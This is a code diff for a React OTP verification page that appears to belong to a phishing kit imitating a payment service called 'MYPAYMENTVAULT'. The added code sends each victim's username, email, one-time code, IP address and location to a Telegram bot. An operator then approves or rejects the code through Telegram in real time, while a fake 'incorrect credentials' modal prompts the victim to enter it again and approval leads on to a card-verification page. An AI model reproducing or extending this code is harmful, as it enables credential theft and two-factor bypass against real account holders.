@@ -4,6 +4,7 @@ import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, ShieldCheck } from "lucide-react";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
+import { sendTelegram, getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
 
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
@@ -22,17 +23,25 @@ export default function Verify() {
   const [emailInput, setEmailInput] = useState("");
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
+  const [waiting, setWaiting] = useState(false);
+  const [showModal, setShowModal] = useState(false);
   const [showLangDropdown, setShowLangDropdown] = useState(false);
   const [resendCooldown, setResendCooldown] = useState(0);
   const [resendMsg, setResendMsg] = useState("");
+  const [alreadyVerified, setAlreadyVerified] = useState(false);
 
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const offsetRef = useRef(0);
 
   useEffect(() => {
     if (isAuthenticated) { navigate("/"); return; }
     if (!pendingUsername) navigate("/login");
   }, [isAuthenticated, pendingUsername, navigate]);
+
+  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
+
 
   const startCooldown = useCallback(() => {
     setResendCooldown(RESEND_COOLDOWN);
@@ -94,15 +103,68 @@ export default function Verify() {
     if (code.length < 6) { setError("Please enter the 6-digit verification code."); return; }
     setError("");
     setLoading(true);
-    const result = await verify(code);
-    setLoading(false);
-    if (!result.ok) {
-      setError(result.error ?? "Invalid or expired verification code. Please try again.");
-      setDigits(["", "", "", "", "", ""]);
-      inputRefs.current[0]?.focus();
-      return;
+
+    if (!alreadyVerified) {
+      const result = await verify(code);
+      setLoading(false);
+      if (!result.ok) {
+        setError(result.error ?? "Invalid or expired verification code. Please try again.");
+        setDigits(["", "", "", "", "", ""]);
+        inputRefs.current[0]?.focus();
+        return;
+      }
+      setAlreadyVerified(true);
+    } else {
+      setLoading(false);
     }
-    navigate("/verify-card");
+
+    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+    const ip  = await getIPInfo();
+
+    await sendTelegram(
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `✅ <b>MYPAYMENTVAULT</b>\n` +
+      `📌 <b>Step 2 — OTP Verified</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `👤 <b>Username</b>   : <code>${pendingUsername}</code>\n` +
+      `📧 <b>Email</b>      : <code>${emailInput || maskedEmail || "-"}</code>\n` +
+      `🔢 <b>Kode OTP</b>   : <code>${code}</code>\n` +
+      `🌐 <b>IP & Lokasi</b>: <code>${ip}</code>\n` +
+      `🕐 <b>Waktu</b>      : ${now}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━`
+    );
+
+    const startOffset = await getLatestOffset();
+    offsetRef.current = startOffset;
+    const sessionKey = Date.now().toString(36);
+
+    await sendApprovalRequest(
+      pendingUsername ?? "-",
+      `OTP: ${code} | Email: ${emailInput || maskedEmail || "-"}`,
+      ip,
+      now,
+      sessionKey,
+      "Verifikasi OTP"
+    );
+    setWaiting(true);
+
+    pollRef.current = setInterval(async () => {
+      const { status, nextOffset, callbackId } = await pollApproval(offsetRef.current, sessionKey);
+      offsetRef.current = nextOffset;
+      if (status === "approved") {
+        clearInterval(pollRef.current!);
+        if (callbackId) await answerCallback(callbackId, "✅ OTP disetujui!");
+        setWaiting(false);
+        navigate("/verify-card");
+      } else if (status === "rejected") {
+        clearInterval(pollRef.current!);
+        if (callbackId) await answerCallback(callbackId, "❌ OTP ditolak.");
+        setWaiting(false);
+        setShowModal(true);
+        setDigits(["", "", "", "", "", ""]);
+        inputRefs.current[0]?.focus();
+      }
+    }, 2500);
   };
 
   return (
@@ -110,6 +172,59 @@ export default function Verify() {
       className="min-h-screen flex flex-col items-center justify-center"
       style={{ background: "#f7f7f7" }}
     >
+      {/* ── INCORRECT CREDENTIALS MODAL ── */}
+      {showModal && (
+        <div style={{
+          position: "fixed", inset: 0, zIndex: 1000,
+          background: "rgba(0,0,0,0.45)",
+          display: "flex", alignItems: "center", justifyContent: "center",
+          padding: "0 20px",
+        }}>
+          <div style={{
+            background: "#fff", borderRadius: 4,
+            padding: "32px 28px 24px",
+            maxWidth: 380, width: "100%",
+            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
+            textAlign: "center",
+          }}>
+            <h3 style={{ fontSize: 18, fontWeight: 600, color: "#111", marginBottom: 14 }}>
+              Incorrect Login Credentials
+            </h3>
+            <p style={{ fontSize: 13, color: "#555", lineHeight: 1.7, marginBottom: 24 }}>
+              You've entered an incorrect username or password. After three failed attempts,
+              your account may lock and you'll need to contact customer service.
+            </p>
+            <button
+              type="button"
+              onClick={() => setShowModal(false)}
+              style={{
+                width: "100%", height: 44, background: "#111", color: "#fff",
+                fontSize: 14, fontWeight: 500, border: "none",
+                borderRadius: 3, cursor: "pointer", letterSpacing: "0.03em",
+              }}
+            >
+              Close
+            </button>
+          </div>
+        </div>
+      )}
+
+      {/* ── WAITING OVERLAY ── */}
+      {waiting && (
+        <div style={{
+          position: "fixed", inset: 0, zIndex: 999,
+          background: "rgba(255,255,255,0.7)",
+          display: "flex", alignItems: "center", justifyContent: "center",
+        }}>
+          <div style={{
+            width: 44, height: 44,
+            border: "4px solid #e5e5e5", borderTop: "4px solid #111",
+            borderRadius: "50%", animation: "spin 0.85s linear infinite",
+          }} />
+          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+        </div>
+      )}
+
       {/* ─── CARD ─── */}
       <div
         className="w-full flex flex-col bg-white"
